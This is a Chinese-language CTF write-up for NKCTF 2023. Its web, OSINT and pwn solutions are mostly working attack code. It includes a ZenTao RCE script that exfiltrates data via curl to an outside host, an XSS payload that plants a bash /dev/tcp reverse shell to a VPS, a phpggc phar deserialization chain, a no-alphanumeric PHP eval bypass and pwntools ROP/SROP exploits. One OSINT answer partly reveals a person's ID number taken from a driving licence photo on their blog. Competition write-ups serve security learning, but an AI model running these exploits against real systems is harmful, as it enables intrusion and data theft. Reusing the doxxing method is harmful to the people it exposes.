<p>第二层sha1强比较<br><code>c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</code></p>
<p>第三层数字比较缺陷，使用小数类型<br><code>e=114514.20</code></p>
<p>第四层php变量值特性，使用<code>[</code>代替<code>_</code><br><code>NS[CTF.go</code></p>
<p>第五层无字母数字rce，使用取反<br><code>cmd=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%9E%98);</code></p>
<h2 id="easy-cms"><a href="#easy-cms" class="headerlink" title="easy_cms"></a>easy_cms</h2><p>访问后台<code>/dede/</code>，用户名<code>admin</code>，密码<code>admin</code></p>
<p>左侧核心栏中有个文件式管理器，可以上传文件</p>
<p>存在过滤</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 不允许这些字符</span><br><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#(/\*)[\s\S]*(\*/)#i&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$content</span>);<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cfg_disable_funs</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$cfg_disable_funs</span>) ? <span class="hljs-variable">$cfg_disable_funs</span> : <span class="hljs-string">&#x27;phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,file_get_contents,highlight_file,fsockopen,fopen,fwrite,preg_replace&#x27;</span>;<br><span class="hljs-variable">$cfg_disable_funs</span> = <span class="hljs-variable">$cfg_disable_funs</span>.<span class="hljs-string">&#x27;,[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert&#x27;</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-variable">$cfg_disable_funs</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$value</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[^a-z]+[&#x27;\&quot;]*<span class="hljs-subst">&#123;$value&#125;</span>[&#x27;\&quot;]*[\s]*[([&#123;]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#^[\s\S]+&lt;\?(php|=)?[\s]+#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;#[`][\s\S]*[`]#i&quot;</span>, <span class="hljs-string">&quot; <span class="hljs-subst">&#123;$content&#125;</span>&quot;</span>) == <span class="hljs-literal">TRUE</span>) &#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">dede_htmlspecialchars</span>(<span class="hljs-variable">$content</span>);<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;<span class="hljs-subst">&#123;$content&#125;</span>&lt;/pre&gt;&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>使用<code>scandir</code>列目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>使用<code>include</code>读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;/f1Aggg&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_cms-1.png"></p>
<h2 id="webpagetest"><a href="#webpagetest" class="headerlink" title="webpagetest"></a>webpagetest</h2><p>webpagetest反序列化</p>
<p><a href="https://xz.aliyun.com/t/11798">AVD-2022-1474319</a></p>
<p>借助<code>phpggc</code>生成执行<code>cat /flag</code>命令的<code>phar</code>文件并发送</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">./phpggc Monolog/RCE2 system &#x27;cat /flag&#x27; -p phar -o testinfo.ini<br><br>URLENC_PAYLOAD=$(cat /root/phpggc/testinfo.ini | xxd -p | tr -d &quot;\n&quot; | sed &quot;s#..#%&amp;#g&quot;)<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=gadget&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br><br>curl -sSkig &#x27;http://c7885b16-57d7-4179-8865-f1f0bb4c73af.node2.yuzhian.com.cn/runtest.php&#x27; -d &#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27; -d &quot;ini=$URLENC_PAYLOAD&quot; -o -<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/webpagetest-1.png"></p>
<h2 id="easy-pms"><a href="#easy-pms" class="headerlink" title="easy_pms"></a>easy_pms</h2><p>右键查看网页源代码得到版本为<code>18.0.beta1</code></p>
<p>github搜到<a href="https://github.com/webraybtl/zentaopms_poc/blob/main/poc_bypass_rce.py">poc</a></p>
<p>修改一下，加个回显，用<code>curl</code>外带到第三方平台<br><code>/flag</code>太长用<code>grep+base64</code>筛选</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-comment"># !/usr/bin/python</span><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">权限绕过+RCE POC 伪静态传参版</span><br><span class="hljs-string">禅道系统 影响版本 安全版本</span><br><span class="hljs-string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span><br><span class="hljs-string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span><br><span class="hljs-string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> requests<br><br>proxies = &#123;<br>    <span class="hljs-comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span><br>    <span class="hljs-comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span><br>&#125;<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-comment"># url=&quot;http://10.211.55.3:8008&quot;</span><br>    url1 = url+<span class="hljs-string">&#x27;/misc-captcha-user.html&#x27;</span><br>    <span class="hljs-comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span><br>    <span class="hljs-comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span><br>    url3 = url + <span class="hljs-string">&#x27;repo-create.html&#x27;</span><br>    url4 = url + <span class="hljs-string">&#x27;repo-edit-10000-10000.html&#x27;</span><br>    headers=&#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>:<span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>:<span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>    &#125;<br><br>    headers2 = &#123;<br>        <span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,<br>        <span class="hljs-string">&quot;Accept-Language&quot;</span>: <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>,<br>        <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>,<br>        <span class="hljs-string">&quot;X-Requested-With&quot;</span>:<span class="hljs-string">&quot;XMLHttpRequest&quot;</span>,<br>        <span class="hljs-string">&quot;Referer&quot;</span>:url+<span class="hljs-string">&quot;/repo-edit-1-0.html&quot;</span><br>    &#125;<br><br>    data1 = <span class="hljs-string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;SCM=Subversion&amp;client=`curl http://tmar9l37.requestrepo.com/?1=\\`cat /flag|grep NKCTF|base64\\``&#x27;</span><br>    s=requests.session()<br>    <span class="hljs-keyword">try</span>:<br>        req1 = s.get(url1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers)<br>        req3 = s.post(url3,data=data1,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        req4 = s.post(url4,data=data2,proxies=proxies,timeout=<span class="hljs-number">5</span>,verify=<span class="hljs-literal">False</span>,headers=headers2)<br>        <span class="hljs-built_in">print</span>(req4.text)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-built_in">print</span>(check(<span class="hljs-string">&quot;http://9dab2a42-f651-4ef6-86a7-a356af0c7437.node2.yuzhian.com.cn/&quot;</span>))<br></code></pre></td></tr></table></figure>

<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_pms-1.png"></p>
<h2 id="xiaopi"><a href="#xiaopi" class="headerlink" title="xiaopi"></a>xiaopi</h2><p>小皮存储型XSS-&gt;rce</p>
<p><a href="https://blog.csdn.net/weixin_46944519/article/details/128954060">参考文章</a></p>
<p>请求头加上<code>X-Requested-With: XMLHttpRequest</code>就能访问登录框</p>
<p>vps上放定时任务，反弹shell</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">poc</span>(<span class="hljs-params"></span>)&#123;<br>  $.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=task_list&#x27;</span>,&#123;&#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-keyword">var</span> id=data.<span class="hljs-property">data</span>[<span class="hljs-number">0</span>].<span class="hljs-property">ID</span>;<br>    $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=exec_task&#x27;</span>,&#123;<br>      <span class="hljs-attr">tid</span>:id<br>    &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res2</span>)&#123;<br>        $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/log.php?type=clearlog&#x27;</span>,&#123;<br><br>        &#125;,<span class="hljs-keyword">function</span>(<span class="hljs-params">res3</span>)&#123;&#125;,<span class="hljs-string">&quot;json&quot;</span>);<br><br><br>    &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>  &#125;,<span class="hljs-string">&quot;json&quot;</span>);<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">save</span>(<span class="hljs-params"></span>)&#123;<br>  <span class="hljs-keyword">var</span> data=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();<br>  data.<span class="hljs-property">task_id</span>=<span class="hljs-string">&quot;&quot;</span>;<br>  data.<span class="hljs-property">title</span>=<span class="hljs-string">&quot;test&quot;</span>;<br>  data.<span class="hljs-property">exec_cycle</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">week</span>=<span class="hljs-string">&quot;1&quot;</span>;<br>  data.<span class="hljs-property">day</span>=<span class="hljs-string">&quot;3&quot;</span>;<br>  data.<span class="hljs-property">hour</span>=<span class="hljs-string">&quot;16&quot;</span>;<br>  data.<span class="hljs-property">minute</span> = <span class="hljs-string">&quot;35&quot;</span>;<br>  data.<span class="hljs-property">shell</span>=<span class="hljs-string">&#x27;bash -i &gt;&amp; /dev/tcp/20.2.129.79/8888 0&gt;&amp;1&#x27;</span>;<br>  $.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/service/app/tasks.php?type=save_shell&#x27;</span>,data,<span class="hljs-keyword">function</span>(<span class="hljs-params">res</span>)&#123;<br>    <span class="hljs-title function_">poc</span>();<br>  &#125;,<span class="hljs-string">&#x27;json&#x27;</span>);<br>&#125;<br><span class="hljs-title function_">save</span>();<br></code></pre></td></tr></table></figure>

<p><code>python</code>开启一个<code>http</code>服务</p>
<p><code>python3 -m http.server 7777</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-2.png"></p>
<p>在登录处用户名框中插入<code>&lt;script src=http://20.2.129.79:7777/1.js&gt;&lt;/script&gt;</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-1.png"></p>
<p>插入完后等待管理员bot登录，触发计划任务，反弹shell</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/xiaopi-3.png"></p>
<h2 id="hard-php"><a href="#hard-php" class="headerlink" title="hard_php"></a>hard_php</h2><p><strong>赛后复现</strong></p>
<p>ctfshow的题目加上一些函数禁用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// not only ++</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$NK</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;NKCTF&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$NK</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-variable">$NK</span>) &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$NK</span>) &lt; <span class="hljs-number">105</span>)&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$NK</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;hacker!!!&quot;</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">phpinfo</span>();<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p><code>NKCTF=$_=(０/０)._;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_=&#39;_&#39;.$__.($_++).$_;$$_[__]($$_[_]);&amp;__=shell_exec&amp;_=echo `cat /flag`&gt;/var/www/html/3.txt</code></p>
<p>url编码后上传</p>
<h1 id="Social-Engineering"><a href="#Social-Engineering" class="headerlink" title="Social Engineering"></a>Social Engineering</h1><h2 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h2><p>百度识图得到关键信息<code>海口</code>，进新闻得到<code>世纪大桥</code>，在<code>世纪大桥</code>旁边有一个<code>世纪公园</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Bridge-1.png"></p>
<p><code>NKCTF&#123;海南省海口市龙华区世纪公园&#125;</code></p>
<h2 id="两个人的夜晚"><a href="#两个人的夜晚" class="headerlink" title="两个人的夜晚"></a>两个人的夜晚</h2><p>根据图上的<code>NCC新城市中心</code>去百度地址</p>
<p><code>NKCTF&#123;天津市西青区中北镇万卉路3号NCC新城市中心&#125;</code></p>
<h2 id="狂飙"><a href="#狂飙" class="headerlink" title="狂飙"></a>狂飙</h2><p>抖音搜狂飙取景地得到<code>莲平路</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E7%8B%82%E9%A3%99-1.png"></p>
<p><code>NKCTF&#123;广东省江门市蓬江区莲平路&#125;</code></p>
<h2 id="real-social-engineering"><a href="#real-social-engineering" class="headerlink" title="real-social-engineering"></a>real-social-engineering</h2><p>github搜他id，找到博客地址：<a href="https://tacooo0o.github.io/">https://tacooo0o.github.io/</a></p>
<p>在<code>2021年终总结</code>这篇文章中找到驾驶证图片，包含了身份证信息</p>
<p><code>NKCTF&#123;6107**********4710&#125;</code></p>
<h2 id="Ferris-Wheel"><a href="#Ferris-Wheel" class="headerlink" title="Ferris_Wheel"></a>Ferris_Wheel</h2><p>百度识图得到<code>永川</code>，<code>摩天轮</code>，<code>渝西</code>等关键词</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/Ferris_Wheel-1.png"></p>
<p>百度地图找到渝西之眼，组合爆破下地名</p>
<p><code>NKCTF&#123;重庆市永川区兴龙湖CBD永川里奥特莱斯渝西之眼摩天轮&#125;</code></p>
<h2 id="旅程的开始"><a href="#旅程的开始" class="headerlink" title="旅程的开始"></a>旅程的开始</h2><p>百度地图搜<code>中铁酒店</code>，得到<code>贵阳火车站</code>，实景一点一点与图片对比</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E6%97%85%E7%A8%8B%E7%9A%84%E5%BC%80%E5%A7%8B-1.png"></p>
<p><code>NKCTF&#123;贵州省贵阳市南明区遵义路1号&#125;</code></p>
<h2 id="The-other-Bridge"><a href="#The-other-Bridge" class="headerlink" title="The other Bridge"></a>The other Bridge</h2><p>百度识图，得到<code>戴家巷崖壁步道</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/The%20other%20Bridge-1.png"></p>
<p>根据提示加个<code>畔</code></p>
<p><code>NKCTF&#123;重庆市江北区嘉陵江畔戴家巷崖壁步道&#125;</code></p>
<h2 id="decompile"><a href="#decompile" class="headerlink" title="decompile"></a>decompile</h2><p>步骤与上面的<code>decompile_revenge</code>一样</p>
<p><code>NKCTF&#123;N0w_you_kn0w_d3compl1te_bytecode&#125;</code></p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&quot;node.yuzhian.com.cn:32220&quot;</span>)<br>shell=asm(shellcraft.sh()).rjust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x90&#x27;</span>)<br>p.sendafter(<span class="hljs-string">b&#x27;min!&#x27;</span>,shell)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="a-story-of-a-pwner"><a href="#a-story-of-a-pwner" class="headerlink" title="a_story_of_a_pwner"></a>a_story_of_a_pwner</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node.yuzhian.com.cn:36024&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context.binary=e<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.readuntil(<span class="hljs-string">&#x27;see this. &#x27;</span>)<br><br>d=<span class="hljs-built_in">int</span>(p.readline().decode().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d))<br><br>libc.address=d-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc.address))<br><br>rdi=libc.address+<span class="hljs-number">0x0019764d</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;comment?&#x27;</span>,p64(bin_sh))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corment?&#x27;</span>,p64(rdi))<br><br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.sendafter(<span class="hljs-string">&#x27;corMenT?&#x27;</span>,p64(system))<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xa</span>+p64(<span class="hljs-number">0x405098</span>)+p64(<span class="hljs-number">0x401502</span>)<br>p.sendlineafter(<span class="hljs-string">&#x27;&gt; \n&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>p.send(payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>


<h2 id="ez-stack"><a href="#ez-stack" class="headerlink" title="ez_stack"></a>ez_stack</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./ez_stack&#x27;</span>)<br>context.binary=e<br>ax_f=<span class="hljs-number">0x401146</span><br>syscall=<span class="hljs-number">0x40114e</span><br>bss=e.bss(<span class="hljs-number">0x400</span>)<br><br><span class="hljs-comment">#p=process(&#x27;./ez_stack&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;node2.yuzhian.com.cn&#x27;</span>,<span class="hljs-string">&#x27;39605&#x27;</span>)<br><br>sig=SigreturnFrame()<br>sig.rax=<span class="hljs-number">0</span><br>sig.rip=syscall<br>sig.rdi=<span class="hljs-number">0</span><br>sig.rsi=bss<br>sig.rdx=<span class="hljs-number">0x200</span><br>sig.rsp=bss+<span class="hljs-number">8</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(ax_f)+p64(syscall)+flat(sig)<br><br>p.sendafter(<span class="hljs-string">&#x27;NKCTF!\n&#x27;</span>,payload)<br><br>sig1=SigreturnFrame()<br>sig1.rax=<span class="hljs-number">59</span><br>sig1.rdi=bss<br>sig1.rsi=<span class="hljs-number">0</span><br>sig1.rdx=<span class="hljs-number">0</span><br>sig1.rsp=bss+<span class="hljs-number">0x200</span><br>sig1.rip=syscall<br><br>payload1=<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ax_f)+p64(syscall)+flat(sig1)<br>p.send(payload1)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure>


